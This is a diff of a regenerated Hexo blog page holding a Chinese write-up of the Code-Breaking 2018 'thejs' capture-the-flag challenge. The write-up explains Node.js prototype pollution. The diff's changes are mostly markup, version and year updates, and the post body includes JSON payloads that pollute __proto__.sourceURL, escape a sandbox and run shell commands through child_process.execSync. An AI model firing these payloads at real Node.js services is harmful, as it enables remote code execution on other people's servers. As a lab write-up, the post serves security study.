@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.3.0">
+<meta name="generator" content="Hexo 8.1.1">
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/Pooka.ico">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/Pooka.ico">
@@ -256,7 +256,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>复现了下P神小密圈Code breaking 挑战赛的js题<code>hard - thejs</code> <a id="more"></a></p>
+        <p>复现了下P神小密圈Code breaking 挑战赛的js题<code>hard - thejs</code> <span id="more"></span></p>
 <p>源码：<a target="_blank" rel="noopener" href="https://github.com/phith0n/code-breaking/tree/master/2018/thejs">https://github.com/phith0n/code-breaking/tree/master/2018/thejs</a></p>
 <p>如果想要修改父对象的原型，有如下两种方式</p>
 <ol>
@@ -282,13 +282,17 @@
 <p><img src="http://img.npfs06.top/20210405161520.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
 <p>通过构造chile_process.exec()就可以执行任意代码了。</p>
 <p>我们可以这么利用</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="function"><span class="keyword">Function</span>(<span class="params"><span class="string">&quot;&quot;</span>,<span class="string">&quot;//# sourceURL=&#x27;xxx&#x27;\r\n CODE \r\n&quot;</span></span>)(<span class="params"></span>)</span>;</span><br></pre></td></tr></table></figure>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="keyword">Function</span>(<span class="params"><span class="string">&quot;&quot;</span>,<span class="string">&quot;//# sourceURL=&#x27;xxx&#x27;\r\n CODE \r\n&quot;</span></span>)(<span class="params"></span>);</span><br></pre></td></tr></table></figure>
+
 <p>本来构造的是</p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">global</span><span class="selector-class">.require</span>(<span class="string">&quot;child_process&quot;</span>)<span class="selector-class">.execSync</span>(<span class="string">&quot;whoami&quot;</span>)<span class="selector-class">.toString</span>()</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">global<span class="selector-class">.require</span>(<span class="string">&quot;child_process&quot;</span>)<span class="selector-class">.execSync</span>(<span class="string">&quot;whoami&quot;</span>)<span class="selector-class">.toString</span>()</span><br></pre></td></tr></table></figure>
+
 <p>但是此题环境中有沙箱对此进行了限制，因此如下payload是无法成功的。需要对沙箱环境进行bypass</p>
 <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span> : &#123;&quot;<span class="type">sourceURL</span><span class="string">&quot; : &quot;</span>\r\nreturn e = () =&gt; &#123;<span class="keyword">for</span> (var a <span class="keyword">in</span> &#123;&#125;)&#123;delete Object.prototype[a];&#125;<span class="keyword">return</span> global.require(<span class="symbol">&#x27;child_process</span>&#x27;).execSync(<span class="symbol">&#x27;whoami</span>&#x27;).to</span><br></pre></td></tr></table></figure>
+
 <p>最终paylaod如下</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span> : &#123;<span class="attr">&quot;sourceURL&quot;</span> : <span class="string">&quot;\r\nreturn e = () =&gt; &#123;for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString()&#125;\r\n&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span> : &#123;<span class="string">&quot;sourceURL&quot;</span> : <span class="string">&quot;<span class="char escape_">\r</span><span class="char escape_">\n</span>return e = () =&gt; &#123;for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString()&#125;<span class="char escape_">\r</span><span class="char escape_">\n</span>&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
 <p>注意下content-type要改成application/json</p>
 <p><img src="http://img.npfs06.top/20210405165225.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
 
@@ -404,7 +408,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">108</span>
+          <span class="site-state-item-count">110</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -468,7 +472,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2023</span>
+  <span itemprop="copyrightYear">2026</span>
 
 
 <!--
